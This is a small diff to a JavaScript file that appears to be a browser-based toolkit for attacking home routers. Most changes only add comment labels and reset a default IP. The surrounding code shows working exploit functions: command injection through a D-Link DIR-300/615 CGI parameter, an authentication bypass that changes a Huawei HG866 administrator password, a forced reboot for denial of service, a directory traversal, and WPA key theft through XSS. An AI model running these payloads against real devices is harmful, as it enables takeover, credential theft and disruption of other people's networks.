@@ -230,6 +230,7 @@ function omnipcx_mastercgicommandexec(ip)
 	document.location="http://"+ip+url;
 }
 
+// D-Link DWR-113 - DOS
 function dwr113_dos(ip)
 {
 	    ip = ip || "192.168.0.1";
@@ -247,7 +248,7 @@ function dwr113_dos(ip)
 // D-Link DIR-300, DIR-615 - Remote Command Execution
 function dir300615_commandexec(ip)
 {
-	ip = ip || "192.168.178.155";
+	ip = ip || "192.168.0.1";
 	cmd = prompt("Command:");
 	url = "/tools_system.xgi?random_num=2012.8.24.13.34.33&exeshell=submit%20`" + encodeURI(cmd) + "`";
 	document.location="http://"+ip+url;
@@ -327,6 +328,7 @@ function urlxss(url) {
 	alert("WPA Key: "+part1+part2+val+part3+part4);
 }
 
+// HUAWEI HG866 - Authentication Bypass
 function hg866pass() {
 	admin=prompt("Change administrator password:");
 	document.hg866pass.psw.value=admin;
@@ -344,6 +346,7 @@ function hg866passr() {
 	document.hg866pass.action="http://"+ip+"/html/password.html";
 	document.hg866pass.submit();
 }
+
 // D-Link DAP-1320 Wireless Range Extender - Directory Traversal.html
 	function dap1320_dirtraversal(ip)
 	{
@@ -368,6 +371,7 @@ function hg866passr() {
 		post('http://' + ip + '/apply.cgi', form);
 		
 	}
+
 	function hg866dosr() {
 		ip=prompt("IP:");
 		document.hg866dos.action="http://"+ip+"/html/admin_reboot.html";
